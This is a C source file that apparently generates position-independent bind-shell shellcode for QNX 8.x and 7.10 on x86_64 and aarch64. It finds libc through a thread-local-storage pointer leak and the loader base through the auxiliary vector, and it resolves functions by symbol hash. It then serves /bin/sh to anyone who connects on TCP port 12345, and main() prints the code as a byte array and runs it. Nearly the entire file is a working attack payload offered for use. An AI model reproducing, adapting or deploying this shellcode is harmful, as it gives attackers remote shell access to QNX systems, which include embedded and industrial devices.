/*
 * QNX 8.04, 8.00, 7.10 x86_64/aarch64le ELF Resolver Shellcode
 * Bindshell (to port 12345)
 *
 * By Claes M Sjöberg, <cmn@signedness.org> April 2026
 *
 * Compile for x86_64:
 *  qcc -Vgcc_ntox86_64 -fPIC -fno-stack-protector \
 *       -Wall -o elf_bindshell elf_bindshell.c 
 *      
 * Compile for aarch64le:
 *  qcc -Vgcc_ntoaarch64le -fPIC -fno-stack-protector \
 *       -Wall -o elf_bindshell elf_bindshell.c
 */

#include <stdint.h>
#include <stdio.h>
#include <stddef.h>
#include <errno.h>
#include <string.h>

/*
 * Elf64 
 */

/* 0x7F 'E' 'L' 'F'          */
#define ELF_MAGIC 0x464C457FU  

/* EI_CLASS values */
#define ELFCLASS32 1
#define ELFCLASS64 2

/* e_ident indices */
#define EI_CLASS 4

/* Segment types */
#define PT_DYNAMIC 2

/* Dynamic entry tags */
#define DT_NULL      0
#define DT_SYMTAB    6
#define DT_STRTAB    5
#define DT_STRSZ    10
#define DT_SYMENT   11

typedef struct {
    uint8_t  e_ident[16];
    uint16_t e_type;
    uint16_t e_machine;
    uint32_t e_version;
    uint64_t e_entry;
    uint64_t e_phoff;
    uint64_t e_shoff;
    uint32_t e_flags;
    uint16_t e_ehsize;
    uint16_t e_phentsize;
    uint16_t e_phnum;
    uint16_t e_shentsize;
    uint16_t e_shnum;
    uint16_t e_shstrndx;
} Elf64_Ehdr;

typedef struct {
    uint32_t p_type;
    uint32_t p_flags;
    uint64_t p_offset;
    uint64_t p_vaddr;
    uint64_t p_paddr;
    uint64_t p_filesz;
    uint64_t p_memsz;
    uint64_t p_align;
} Elf64_Phdr;

typedef struct {
    uint32_t st_name;
    uint8_t  st_info;
    uint8_t  st_other;
    uint16_t st_shndx;
    uint64_t st_value;
    uint64_t st_size;
} Elf64_Sym;

typedef struct {
    int64_t  d_tag;
    uint64_t d_val;   /* also used as d_ptr */
} Elf64_Dyn;


/* Hashes for all the symbols used */
#define HASH_EXECVE 0xd1b41b25
#define HASH_DLOPEN 0xcef94d0e
#define HASH_DLCLOSE 0xde67cade
#define HASH_DLSYM 0x0677db8d
#define HASH_CLOSE 0x0667cac5
#define HASH_DUP2 0x0033e232 
#define HASH_FORK 0x0034caab
#define HASH_EXIT 0x00346d94
#define HASH_ENVIRON 0x23965668

/* Symbols used */
typedef struct syms {
    /* libc.so */
    int (*execve)(const char *, char **, char **);
    void *(*dlopen)(char *, int);
    int (*dlclose)(void *);
    void *(*dlsym)(void *, char *);
    int (*close)(int);
    int (*dup2)(int, int);
    int (*fork)(void);
    void (*exit)(int);
    char **environ;

    /* libsocket.so */
    int (*socket)(int, int, int);
    int (*bind)(int, void *, unsigned int);
    int (*listen)(int, int);
    int (*accept)(int, void *, void *);
} syms_t;

/* Local routines */
static int shserv(syms_t *);
static uint32_t calc_hash(const char *);
static void *getsym(const void *, uint32_t);
static void *find_elf_base(const void *);
static void *get_tls(void);
static void *get_libc_base(void);
static int get_auxw_bases(char **, void **, void **);


/* Symbol resolver macro */
#define GETSYM(_save, _base, _hash)                     \
{                                                       \
    if ( ((_save) = getsym((_base), (_hash))) == NULL)  \
        return -1;                                      \
}                                                       \

/*
 * Start of shellcode.
 */
int
shellcode_start()
{
    syms_t sm;
    char str[16];
    void *libcbase;
    void *ldbase;
    void *pbase;
    void *sh;

    if ( (libcbase = get_libc_base()) == NULL) 
        return -1;

    if ( (sm.environ = *(char ***)getsym(libcbase, HASH_ENVIRON)) == NULL)
        return -2;

    if (get_auxw_bases(sm.environ, &ldbase, &pbase) != 2)
        return -3;

    GETSYM(sm.dlopen, ldbase, HASH_DLOPEN);
    GETSYM(sm.dlclose, ldbase, HASH_DLCLOSE);
    GETSYM(sm.dlsym, ldbase, HASH_DLSYM);
    GETSYM(sm.execve, libcbase, HASH_EXECVE);
    GETSYM(sm.close, libcbase, HASH_CLOSE);
    GETSYM(sm.dup2, libcbase, HASH_DUP2);
    GETSYM(sm.fork, libcbase, HASH_FORK);
    GETSYM(sm.exit, libcbase, HASH_EXIT);

    str[0] = 'l';
    str[1] = 'i';
    str[2] = 'b';
    str[3] = 's';
    str[4] = 'o';
    str[5] = 'c';
    str[6] = 'k';
    str[7] = 'e';
    str[8] = 't';
    str[9] = '.';
    str[10] = 's';
    str[11] = 'o';
    str[12] = '\0';
                           /* RTD_LAZY */
    if ( (sh = sm.dlopen(str, 0x0001)) == NULL) 
        return -4;

    str[0] = 's';
    str[1] = 'o';
    str[2] = 'c';
    str[3] = 'k';
    str[4] = 'e';
    str[5] = 't';
    str[6] = '\0';

    if ( (sm.socket = sm.dlsym(sh, str)) == NULL) 
        return -5;

    str[0] = 'b';
    str[1] = 'i';
    str[2] = 'n';
    str[3] = 'd';
    str[4] = '\0';
    
    if ( (sm.bind = sm.dlsym(sh, str)) == NULL) 
        return -6;
    
    str[0] = 'l';
    str[1] = 'i';
    str[2] = 's';
    str[3] = 't';
    str[4] = 'e';
    str[5] = 'n';
    str[6] = '\0';
    
    if ( (sm.listen = sm.dlsym(sh, str)) == NULL) 
        return -7;

    str[0] = 'a';
    str[1] = 'c';
    str[2] = 'c';
    str[3] = 'e';
    str[4] = 'p';
    str[5] = 't';
    str[6] = '\0';

    if ( (sm.accept = sm.dlsym(sh, str)) == NULL) 
        return -8;

    shserv(&sm);
    return -1;
}

/*
 * Bindshell server.
 */
static int
shserv(syms_t *sp)
{
    struct {
        uint8_t len;
        uint8_t family;
        uint16_t port;
        uint32_t ip;
        uint64_t pad;
    } addr;

    int sock;
    int csock;
    char str[8];
    char *av[2];

    addr.family = 0x02;     /* AF_INET */
    addr.port = 0x3930;     /* 12345 */
    addr.ip = 0x00000000;   /* 0.0.0.0 */
    addr.pad = 0x0000000000000000;

    /* AF_INET, SOCK_STREAM, IPPROTO_TCP */
    if ( (sock = sp->socket(0x2, 0x1, 0x6)) < 0)
        return -1;

    if (sp->bind(sock, &addr, 16) < 0)
        return -1;

    if (sp->listen(sock, 0) < 0)
        return -1;

    str[0] = '/';
    str[1] = 'b';
    str[2] = 'i';
    str[3] = 'n';
    str[4] = '/';
    str[5] = 's';
    str[6] = 'h';
    str[7] = '\0';
    av[0] = str;
    av[1] = NULL;
    
    while ( (csock = sp->accept(sock, NULL, NULL)) > 0) {
        if (sp->fork() == 0) {
            sp->dup2(csock, 0);
            sp->dup2(csock, 1);
            sp->dup2(csock, 2);
            sp->close(csock);
            sp->execve(str, av, NULL);
            sp->exit(1);
        }
    }

    sp->close(sock);
    return -1;
}


static uint32_t
calc_hash(const char *str)
{
    uint32_t hash = 0;

    while (*str) 
        hash = ((hash << 5) | (hash >> 27)) + *str++;
    return hash;
}


static void *
getsym(const void *elf_base, uint32_t target_hash)
{
    const uint8_t *base; 
    const Elf64_Ehdr *ehdr;
    const Elf64_Phdr *phdrs; 
    const Elf64_Sym *symtab;
    const char *strtab;
    uint64_t syment;
    uint64_t nsyms;

    base = elf_base;
    ehdr = elf_base;
    phdrs = (const Elf64_Phdr *)(base + ehdr->e_phoff);

    /* Locate PT_DYNAMIC segment */
    Elf64_Dyn *dyn = NULL;
    for (uint16_t i = 0; i < ehdr->e_phnum; i++) {
        if (phdrs[i].p_type == PT_DYNAMIC) {
            dyn = (Elf64_Dyn *)(base + phdrs[i].p_vaddr);
            break;
        }
    }
    if (dyn == NULL) 
        return NULL;

    /* Walk dynamic entries to find symtab, strtab, and syment */
    symtab = NULL;
    strtab = NULL;
    syment = sizeof(Elf64_Sym);

    for (Elf64_Dyn *d = dyn; d->d_tag != DT_NULL; d++) {
        switch (d->d_tag) {
            case DT_SYMTAB: 
                symtab = (Elf64_Sym *)(base + d->d_val); 
                break;
            
            case DT_STRTAB: 
                strtab = (char *)(base + d->d_val); 
                break;
            
            case DT_SYMENT: 
                syment = d->d_val;                               
                break;
        }
    }
    if (symtab == NULL || strtab == NULL) 
        return NULL;

    /* Derive symbol count from the gap between symtab and strtab */
    nsyms = (uint64_t)((uint8_t *)strtab - (uint8_t *)symtab) / syment;

    for (uint64_t i = 0; i < nsyms; i++) {
        const Elf64_Sym *sym;

        sym = (Elf64_Sym *)((uint8_t *)symtab + i * syment);

        if (sym->st_name == 0 || sym->st_value == 0) 
            continue;

        if (calc_hash(strtab + sym->st_name) == target_hash)
            return (void *)(base + sym->st_value);
    }

    return NULL;
}

#include <sys/nto_version.h>
#if defined(_NTO_VERSION) && (_NTO_VERSION == 800)

/*
 * Thread local storage. This data is at the top of each threads stack.
 * __errptr is a pointer to errno, which is located in libc -> leak
 */
struct _thread_local_storage {
    _Sizet __stacksize;
    void *__arg;
    int *__errptr;
    int __errval; /* Not used for main() thread. */
    unsigned __flags;
    int __pid;
    int __tid;
    unsigned __owner;
    void *__stackaddr;
    unsigned __guardsize;
    unsigned __numkeys;
    void **__keydata; /* Indexed by pthread_key_t */
    void *__cleanup;
    void *__pt_tsd;
    void *__ldd_data; /* Used by the ldd. */
    //__sa_action_func_t *__sigaction;
    void *__sigaction;
    void *__muon_reserved;
    void *__cxa_atexit_data;
};

#elif defined(_NTO_VERSION) && (_NTO_VERSION == 710)
/*
 * Thread local storage. This data is at the top of each threads stack.
 */

#define __TLS_FIELDS                                    \
    void *__exitfunc;       \
    void *__arg;            \
    int *__errptr;      \
    int __errval; /* Not used for main() thread. */ \
    unsigned __flags;        \
    int __pid;          \
    int __tid;          \
    unsigned __owner;        \
    void *__stackaddr;    \
    unsigned __reserved1;    \
    unsigned __numkeys;      \
    void **__keydata; /* Indexed by pthread_key_t */ \
    void *__cleanup;      \
    void *__cxa_atexit_data;  \
    void *__ldd_data; /* Used by the ldd. */ \
    void *__sigaction;

struct _thread_local_storage {
    __TLS_FIELDS
};

#else
#error "Missing QNX target version"
#endif

/*
 * Find ELF base from address.
 * Walk backward and look for ELF tag.
 */
static void *
find_elf_base(const void *addr)
{
    uint8_t *p;

    /* Align down to the nearest page boundary */
    p = (uint8_t *)((uintptr_t)addr & ~(uintptr_t)0xFFF);

    for (; p > (const uint8_t *)0x1000; p -= 0x1000) {
        if (*(const uint32_t *)p == ELF_MAGIC) {
            return p;
        }
    }

    return NULL;
}


/*
 * Get thread local storage pointer.
 */
static inline void *
get_tls()
{
    void *tp;

#if defined(__x86_64__) && (_NTO_VERSION == 800)
    __asm__ __volatile__(
        "movq %%fs:0x10, %%rax"
        : "=a" (tp)
    );
#endif

#if defined(__aarch64__) && (_NTO_VERSION == 800)
    __asm__ __volatile__(
        "mrs x0, tpidr_el0\n\t"
        "ldr %0, [x0, #0x8]"
        : "=r"(tp)
    );
#endif

#if defined(__x86_64__) && (_NTO_VERSION == 710)
    __asm__ __volatile__(
        "movq %%fs:0x38, %%rax"
        : "=a" (tp)
    );
#endif

#if defined(__aarch64__) && (_NTO_VERSION == 710)
    __asm__ __volatile__(
        "mrs x0, tpidrro_el0\n\t"
        : "=r"(tp)
    );
#endif

    return tp;
}


/*
 * Attempt to find libc base by walking backwards 
 * from leaked address.
 */ 
static void *
get_libc_base()
{
    struct _thread_local_storage *tls;
    void *leak;
    
    if ( (tls = get_tls()) == NULL) 
        return NULL;
    
#if defined(_NTO_VERSION) && (_NTO_VERSION == 800)
    /* errno points inside libc */
    leak = tls->__errptr;
#elif defined(_NTO_VERSION) && (_NTO_VERSION == 710)
    /* __exitfunc points inside libc */
    leak = tls->__exitfunc;
#endif

    return find_elf_base(leak);
}


/*
 * Get base of ldqnx and program from aux vector
 * which is right after environment strings
 */
#define AT_PHDR 3
#define AT_BASE 7
static int
get_auxw_bases(char **envp, void **ldqnx, void **prog)
{
    struct auxent {
        uint64_t tag;
        uint64_t val;
    } *apt;
    size_t i;
    int ret;

    ret = 0;

    /* Walk past environ */
    i=0;
    while (envp[i] != NULL) 
        i++;
    i++;

    /* Traverse the vector */
    apt = (struct auxent *)&envp[i];
    while (apt->tag != 0) {
        
        /* ldqnx */
        if (apt->tag == AT_BASE) {
            *ldqnx = (void *)apt->val;
            ret++;
        }
    
        /* Program */
        if (apt->tag == AT_PHDR) {
            *prog = find_elf_base((void *)apt->val);
            ret++;
        }

        if (ret == 2)
            return ret;

        apt++;
    }

    return ret;
}

/* Symbol to mark end of shellcode */
void shellcode_end() {}

/*
 * Write shellcode to stdout as byte array
 */
void
writecode(uint8_t *code, size_t codelen)
{
    size_t i;

    printf("\n/* ELF resolving shellcode %lu bytes */\n", 
        codelen);
    printf("unsigned char code[] = {\n");

    for (i=0; i<codelen; i++) {
        printf("0x%02x", code[i]);
        if ((i+1) != codelen)
            printf(", ");

        if (((i+1) % 12) == 0)
            printf("\n");
    }
    printf("}; \n");

}


int
main(int argc, char **argv, char **envp)
{
    uint8_t *code;
    size_t codelen;
    int ret;

    code = (void *)shellcode_start;
    codelen = (void *)shellcode_end - (void *)shellcode_start;
    writecode(code, codelen);

    printf("[+] Running shellcode (%lu bytes)\n", codelen);
    ret = shellcode_start();
    fprintf(stderr, "** Error: shellcode failed: %d %s\n", 
        ret, strerror(errno));
    getchar();
    return -1;
}
